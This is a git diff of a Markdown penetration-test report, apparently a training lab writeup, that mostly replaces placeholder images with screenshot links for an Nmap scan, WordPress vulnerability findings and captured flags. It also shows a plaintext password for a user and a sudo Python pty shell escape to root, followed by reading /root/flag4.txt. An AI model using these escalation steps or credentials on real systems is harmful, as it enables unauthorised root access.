@@ -81,7 +81,7 @@ PORT    STATE SERVICE     VERSION\
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\
 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 
-
+![Target 1 Port Scan](Images/2-5NMAPScan192.168.1.110.png)
 
 ### The following vulnerabilities were identified on Target 1:
 
@@ -92,7 +92,7 @@ PORT    STATE SERVICE     VERSION\
 - Wordpress Pingback Locator - CVE-2013-0235
 - Wordpress XML-RPC Pingback API
 
-![alt text](image.jpg)
+![WordPress Exploit Scan](Images/3-02Wpscan exploits.png)
 
 
 
@@ -113,10 +113,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         cd /var/www/html
         nano service.html
         
-        
-
-
-![alt text](image.jpg)
+![Flag 1](Images/3-2flag1serviceshtml.png)
 
 
       flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
@@ -127,7 +124,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         cd /var/www
         cat flag2.txt
 
-      ![alt text](image.jpg)
+![Flag 2](Images/3-5flag2.png)
       
       
       flag3{afc01ab56b50591e7dccf93122770cd2}
@@ -144,7 +141,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       select * from wp_comments
       select * from wp_users
 
-      ![alt text](image.jpg)
+ ![Flag 3](Images/6flag3.png)
+      
       
       flag4{715dea6c055b9fe3337544932f2941ce}
     - **Exploit Used**
@@ -152,13 +150,13 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       allowing full access to all directories.  A find was performed, revealing a final flag file 
       in /root/flag4.txt
 
-      - _TODO: Include the command run_
+'''
       su steven
       pink84
       sudo python -c 'import pty;pty.spawn("/bin/bash")'
       find / -iname flag*
       cd /root/
       cat flag4.txt
+'''
 
-
-      ![alt text](image.jpg)
+      ![Flag 4](Images/9flag4)
